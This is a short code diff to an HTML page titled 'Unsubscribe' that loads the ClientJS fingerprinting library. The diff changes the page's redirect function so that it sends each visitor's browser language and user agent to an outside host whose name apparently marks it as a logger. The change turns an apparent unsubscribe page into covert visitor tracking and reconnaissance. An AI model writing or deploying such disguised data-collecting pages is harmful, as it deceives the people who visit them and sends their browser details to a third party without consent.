@@ -4,8 +4,9 @@
 	<title>Unsubscribe</title>
 <script src="https://raw.githubusercontent.com/jackspirou/clientjs/master/dist/client.min.js"></script>
 <script>
+var client = new ClientJS();
 function abb(){
-window.location = "http://logerfromgithub.byethost11.com?systemlang=''";
+window.location = "http://logerfromgithub.byethost11.com?systemlang='"+client.getLanguage()+"'&ua='"+client.getUserAgentLowerCase()+"'";
 };
 </script>
 </head>
